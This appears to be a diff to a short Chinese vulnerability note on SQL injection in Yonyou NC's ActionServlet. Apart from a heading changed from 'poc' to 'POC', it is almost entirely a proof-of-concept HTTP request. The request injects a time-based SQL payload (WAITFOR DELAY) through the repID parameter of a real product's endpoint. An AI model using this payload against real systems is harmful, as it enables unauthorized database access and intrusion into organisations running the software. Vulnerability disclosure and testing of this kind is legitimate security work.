@@ -1,7 +1,7 @@
 ## 用友NC-ActionServlet存在SQL注入漏洞
 
 
-## poc
+## POC
 ```
 GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20WAITFOR%20DELAY%20'0:0:5'--+&unitID=public HTTP/1.1
 Host: 
